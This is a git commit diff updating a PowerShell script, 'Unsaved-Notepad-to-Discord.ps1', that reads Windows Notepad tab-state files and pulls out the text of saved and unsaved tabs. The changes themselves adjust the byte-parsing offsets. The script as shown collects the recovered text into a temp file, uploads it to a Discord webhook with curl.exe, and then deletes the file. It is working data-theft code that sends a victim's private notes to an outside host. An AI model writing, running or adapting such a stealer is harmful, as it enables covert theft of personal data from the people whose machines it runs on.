57244318d9dd3f9c6bbcde97f96964bf3e38460f
egieb <93350544+beigeworm@users.noreply.github.com>
2024-03-13 15:45:46 +0000

    Update Unsaved-Notepad-to-Discord.ps1

--- Discord Scripts/Unsaved-Notepad-to-Discord.ps1
+++ Discord Scripts/Unsaved-Notepad-to-Discord.ps1
@@ -16,11 +16,9 @@ USAGE
 $hookurl = "$dc"
 
 $outpath = "$env:TMP\notepad.txt"
-
 $appDataDir = [Environment]::GetFolderPath('LocalApplicationData')
 $directoryRelative = "Packages\Microsoft.WindowsNotepad_*\LocalState\TabState"
 $matchingDirectories = Get-ChildItem -Path (Join-Path -Path $appDataDir -ChildPath 'Packages') -Filter 'Microsoft.WindowsNotepad_*' -Directory
-
 foreach ($dir in $matchingDirectories) {
     $fullPath = Join-Path -Path $dir.FullName -ChildPath 'LocalState\TabState'
     $listOfBinFiles = Get-ChildItem -Path $fullPath -Filter *.bin
@@ -28,14 +26,12 @@ foreach ($dir in $matchingDirectories) {
         if ($fullFilePath.Name -like '*.0.bin' -or $fullFilePath.Name -like '*.1.bin') {
             continue
         }
-
         $seperator = ("=" * 60)
         $SMseperator = ("-" * 60)
         $seperator | Out-File -FilePath $outpath -Append
         $filename = $fullFilePath.Name
         $contents = [System.IO.File]::ReadAllBytes($fullFilePath.FullName)
         $isSavedFile = $contents[3]
-
         if ($isSavedFile -eq 1) {
             $lengthOfFilename = $contents[4]
             $filenameEnding = 5 + $lengthOfFilename * 2
@@ -45,25 +41,27 @@ foreach ($dir in $matchingDirectories) {
             $SMseperator | Out-File -FilePath $outpath -Append
             Get-Content -Path $originalFilename -Raw | Out-File -FilePath $outpath -Append
 
-
         } else {
             "Found an unsaved tab!" | Out-File -FilePath $outpath -Append
             $filename | Out-File -FilePath $outpath -Append
             $SMseperator | Out-File -FilePath $outpath -Append
             $filenameEnding = 0
             $delimeterStart = [array]::IndexOf($contents, 0, $filenameEnding)
-            $delimeterEnd = [array]::IndexOf($contents, 1, $filenameEnding)
-
+            $delimeterEnd = [array]::IndexOf($contents, 3, $filenameEnding)
             $fileMarker = $contents[($delimeterStart + 2)..($delimeterEnd - 1)]
             $fileMarker = -join ($fileMarker | ForEach-Object { [char]$_ })
-
-            $originalFileContents = [System.Text.Encoding]::Unicode.GetString($contents[($delimeterEnd + 4 + $fileMarker.Length)..($contents.Length - 6)])
-            $originalFileContents | Out-File -FilePath $outpath -Append
+            $originalFileBytes = $contents[($delimeterEnd + 9 + $fileMarker.Length)..($contents.Length - 6)]
+            $originalFileContent = ""
+            for ($i = 0; $i -lt $originalFileBytes.Length; $i++) {
+                if ($originalFileBytes[$i] -ne 0) {
+                    $originalFileContent += [char]$originalFileBytes[$i]
+                }
+            }
+            $originalFileContent | Out-File -FilePath $outpath -Append
         }
      "`n" | Out-File -FilePath $outpath -Append
     }
 }
-
 curl.exe -F file1=@"$outpath" $hookurl
 Sleep 2
 Remove-Item -Path $outpath -force
